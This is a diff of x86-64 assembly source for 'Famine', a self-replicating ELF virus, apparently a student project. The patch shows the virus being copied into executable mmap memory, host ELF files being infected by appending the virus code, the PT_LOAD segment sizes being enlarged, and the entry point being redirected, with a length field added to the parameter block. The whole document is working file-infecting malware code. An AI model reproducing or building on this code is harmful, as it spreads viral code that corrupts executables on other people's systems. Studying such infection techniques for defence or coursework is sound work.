@@ -86,12 +86,10 @@ _inject:
 		push rdx
 
 		push r8
-		; mmap
+		; copy the virus into a mmap executable
 		xor rdi, rdi; NULL
 
-		lea rsi, [rel _eof]
-		lea rax, [rel _start]
-		sub rsi, rax ; length
+		mov rsi, [rel length]
 		push 7
 		pop rdx; PROT_READ | PROT_WRITE | PROT_EXEC
 		push 34
@@ -116,8 +114,8 @@ _inject:
 
 		pop rdx
 
-		push rsi
-		push rdi
+		push rsi ; save length
+		push rdi ; save addr
 
 		lea rsi, [rel _start]
 		lea rax, [rel _host]
@@ -126,10 +124,10 @@ _inject:
 
 		call rax ; jump to mmaped memory
 
-		pop rdi
-		pop rsi
+		pop rdi ; pop addr
+		pop rsi ; pop length
 
-		; munmap
+		; munmap the previous exec
 		push 11
 		pop rax
 		syscall
@@ -462,13 +460,15 @@ _infect_file: ; (string rdi, stat rsi)
 			; TODO: maybe infect via PT_NOTE ?
 
 			; copy virus
-			sub rdx, 8 * 3
+			sub rdx, 8 * 4
 			add rdi, r13 ; addr pointer -> mmap
 			mov rsi, r8
 			call _ft_memcpy
 
 			; add _params
 			add rax, rdx ; go to the end
+			mov [rax], rdx ; length
+			add rax, 8
 			mov rsi, [rbx + 16]
 			mov [rax], rsi ; vaddr
 			add rax, 8
@@ -489,7 +489,7 @@ _infect_file: ; (string rdi, stat rsi)
 			mov [r13 + 24], rdi ; new_entry
 
 			; change pt_load size
-			add rdx, 8 * 3
+			add rdx, 8 * 4
 			add [rbx + 32], rdx; p_filesz + virus
 			add [rbx + 40], rdx; p_memsz + virus
 
@@ -795,6 +795,7 @@ elf_magic db 0x7f, 0x45, 0x4c, 0x46, 0x2, 0x0
 signature db `Famine version 1.0 (c)oded by lmartin`, 0x0; sw4g signature
 
 _params:
+	length dq 0x0
 	vaddr dq 0x0
 	entry_inject dq 0x0
 	entry_prg dq 0x0
